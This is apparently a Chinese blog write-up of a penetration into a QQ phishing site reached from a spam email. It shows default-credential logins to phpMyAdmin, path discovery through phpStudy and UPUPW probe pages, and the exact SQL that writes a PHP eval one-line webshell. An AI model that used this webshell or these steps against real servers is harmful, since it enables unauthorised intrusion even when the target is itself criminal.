---
title:  渗透实战之QQ空间钓鱼网站
date: 2019-11-19 12:31:23
author: dylan
top: false
cover: false
password: 
categories: web安全
tags: 
    - 钓鱼网站
    - 渗透实战
    - phpmyadmin getshell
---
# 0x00 前言

打开邮箱，发现垃圾箱里躺着一封垃圾邮件

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119123537.png)

一看就是钓鱼邮件，话不多说，搞他。

没什么技术含量，看看就好。

# 0x01 渗透过程
## 第一部分

直接打开链接

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119123923.png)

除了登陆可以点击，其他超链接都是假的，也太不敬业了。

然后发现地址栏域名和垃圾邮箱里面的给的链接的域名不一样，
是跳转过去的，遂访问初始的域名。

打开一看，`phpStudy 探针 2014` 页面。

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119153349.png)


phpstudy 探针 可以测试 数据库连接，试试看弱口令，`phpstudy`数据库默认账号密码`root`
测试成功。

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119153955.png)

然后尝试登陆`phpmyadmin`

直接访问`url+/phpMyAdmin/`,使用测试成功的弱口令登陆。

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119154545.png)

数据库里面没什么东西，因为在`探针页面`知道了物理路径，所有直接写一句话木马，连接之。

`select '<?php @eval($_POST[pass]);?>' into outfile 'D:/phpstudy/WWW/test.php';`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119155056.png)

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119155336.png)


这个服务器里面啥都没有，只有几个用来跳转连接的php文件，
就回到开头，继续搞qq钓鱼网站的。

## 第二部分

QQ钓鱼站的后台，找了一圈没找到。

访问一个不存在的文件，提示页面如下图
发现是用`UPUPW`搭建的，猜测会不会也有`phpmyadmin`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119155929.png)

尝试访问`url+/phpMyAdmin/` ，返回 **404**

又尝试访问`url+/pmd/`，成了

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119160659.png)

尝试弱口令成功登陆

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119160813.png)

准备写入一句话木马，不知道物理路径。
使用语句

`select @@basedir`

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119161156.png)

然后尝试在`upupw`默认网站路径下写入木马
提示：`(Errcode: 2 "No such file or directory")`
写入失败，文件夹不存在



然后又尝试了其他路径名，均以失败告终
一筹莫展之际，
想到`upupw`会不会也有探针页面，会不会没删？
百度之，`upupw`默认的探针页面是`u.php`,
尝试访问

![](https://raw.githubusercontent.com/dylan903/ImgUrl/master/Img/20191119161857.png)

得到网站物理路径，然后又是愉快的上木马连接了。


# 参考文章

[PhpMyAdmin 网站路径信息获取](https://bbs.ichunqiu.com/thread-19893-1-1.html)
[总结下写phpmyadmin写shell的方法](https://blog.csdn.net/q1352483315/article/details/88904001)
[phpmyadmin getshell姿势 - 先知社区](https://xz.aliyun.com/t/3283)


